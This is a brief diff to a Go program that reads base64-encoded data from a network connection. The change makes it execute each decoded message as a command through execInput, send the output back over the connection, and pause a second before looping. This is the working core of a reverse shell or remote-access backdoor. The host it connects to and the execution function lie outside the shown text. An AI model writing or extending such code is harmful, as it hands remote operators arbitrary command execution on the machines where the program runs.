@@ -12,6 +12,7 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"time"
 )
 
 func handleError(err error) {
@@ -93,10 +94,11 @@ func main() {
 	
 	for {
 		buffer := make([]byte, 1024)
-		// buffer = buffer[:0]
 		_, err := conn.Read(buffer)
 		handleError(err)
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
-		fmt.Println(string(sDec))
+		resp := execInput(string(sDec))
+		conn.Write([]byte(resp))
+		time.Sleep(time.Second)
 	}
 }
